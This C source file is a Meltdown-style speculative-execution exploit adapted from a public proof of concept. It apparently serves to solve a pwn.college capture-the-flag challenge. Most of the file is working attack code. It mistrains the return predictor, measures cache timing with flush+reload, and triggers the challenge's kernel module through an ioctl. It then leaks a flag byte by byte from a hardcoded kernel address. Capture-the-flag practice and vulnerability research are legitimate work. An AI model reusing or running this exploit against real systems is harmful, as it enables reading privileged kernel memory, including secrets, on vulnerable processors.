// Source: https://github.com/corsix/meltdown-poc
#define _GNU_SOURCE

#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#include <x86intrin.h>
#include <immintrin.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sched.h>
#include <fcntl.h>

// replace with actual flag length
#define FLAG_LEN 21

uint64_t in_cache_threshold;
char* detector;

__attribute__((noinline))
void speculate(const char* target, const char* detector) {
    asm volatile (
    ".intel_syntax noprefix;"

    "mfence;"
    "call herring;"

    // Speculatively executed (because of herring's ret being mispredicted):
    "movzx eax, byte ptr [%0];"
    "shl eax, 12;"
    "movzx eax, byte ptr [%1+rax];"

    "herring:"
        // Lots of slow dependent instructions:
        "xorps xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"
        "sqrtpd xmm0, xmm0;"

        // Using result of dependent instructions, adjust rsp to trick prediction of ret
        "movd eax, xmm0;"
        "lea rsp, [rsp+rax+8];"

        // Actually returns from speculate, but predicted as returning from herring
        "ret;"

    ".att_syntax;"
    : : "r" (target), "r" (detector) : "rax");
}

void maccess(const char *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

__attribute__((noinline))
int timed_read(const char *ptr) {
  uint64_t start, end, junk;
  uint32_t tsc;

  _mm_mfence();
  start = __rdtscp(&tsc);
  _mm_mfence();
  maccess(ptr);
  _mm_mfence();
  end = __rdtscp(&tsc);
  _mm_mfence();
  _mm_clflush(ptr);
  _mm_mfence();

  return (int)(end - start);
}

uint64_t baseline_timed(const char* target, int in_cache) {
  uint64_t total = 0;
  (void)timed_read(target);
  for (uint32_t i = 0; i < 16; ++i) {
    if (!in_cache) {
      _mm_clflush(target);
      _mm_mfence();
    }
    total >>= 2;
    total += timed_read(target);
  }
  return total;
}

int read_via_speculate(const char* target) {
  for (uint32_t i = 0; i < 256; ++i) {
    _mm_clflush(detector + i*4096);
  }

  uint64_t timings[256];
  for (uint32_t i = 0; i < 256; ++i) {
    speculate(target, detector);
    timings[i] = timed_read(detector + i*4096);
  }

  uint32_t min_timing = -1;
  int min_idx = -1;
  for (uint32_t i = 0; i < 256; ++i) {
    if (timings[i] < in_cache_threshold) {
      if (timings[i] < min_timing) {
        min_timing = timings[i];
        min_idx = i;
      }
    }
  }
  return min_idx;
}

void pin_cpu(int cpu) {
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(cpu, &my_set);
  sched_setaffinity(0, sizeof(my_set), &my_set);
}

int main(int argc, char** argv) {
  pin_cpu(1);

  detector = mmap(0, 4096 * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANON|MAP_POPULATE, 0, 0);
  in_cache_threshold = (baseline_timed(detector, 1) * 3 + baseline_timed(detector, 0)) >> 2;

  printf("threshold: %lx\n", in_cache_threshold);

  const char* flag_addr = (const char *)0xffffffffc0002460;

  char flag[FLAG_LEN] = {0};

  int chall_fd = open("/proc/pwncollege", O_RDONLY);

  for ( int i = 0; i < FLAG_LEN; i++ ) {
    while (flag[i] == 0 || flag[i] < '.' || flag[i] > '}') {
        ioctl(chall_fd, 1337);
        flag[i] = read_via_speculate(flag_addr + i);
    }
  }
  printf("%s\n", flag);
}
